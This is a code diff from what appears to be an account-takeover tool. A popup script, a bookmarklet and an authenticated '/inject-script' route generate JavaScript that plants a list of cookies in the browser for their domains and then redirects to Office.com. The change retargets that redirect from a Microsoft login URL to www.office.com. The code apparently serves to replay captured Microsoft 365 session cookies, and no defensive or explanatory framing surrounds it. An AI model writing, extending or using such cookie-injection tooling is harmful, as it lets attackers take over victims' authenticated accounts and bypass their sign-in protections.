@@ -322,9 +322,9 @@ function generatePopupScript(cookies) {
     output += `document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";\n`;
   }
   output += '\n';
-  output += '// Redirect after 3s\n';
+  output += '// Redirect to Office.com after injecting cookies\n';
   output += 'setTimeout(() => {\n';
-  output += '  window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  output += '  window.location.href = "https://www.office.com/";\n';
   output += '}, 3000);\n';
   
   return output;
@@ -460,7 +460,7 @@ var bookmarklet = 'javascript:(function(){' +
   'document.cookie=c.name+"="+encodeURIComponent(c.value)+"; domain="+domain+"; path=/; Secure; SameSite=None";' + 
   '});' + 
   'setTimeout(function(){' + 
-  'window.location.href="https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?client_id=' + clientId + '&redirect_uri=https://www.office.com/&response_type=code&scope=openid%20profile%20email";' + 
+   'window.location.href="https://www.office.com/";' + 
   '},2000);' + 
   '})()';
 
@@ -670,9 +670,9 @@ router.get('/inject-script', userAuth, async (req, res) => {
 
     const script = '(function() {\n' +
       cookieStatements + '\n' +
-      '// Redirect after 3s\n' +
+      '// Redirect to Office.com after injecting cookies\n' +
       'setTimeout(function() {\n' +
-      'window.location.href = "https://login.microsoftonline.com/' + tenant + '/?auth=2";\n' +
+      'window.location.href = "https://www.office.com/";\n' +
       '}, 3000);\n' +
       '})();';
 
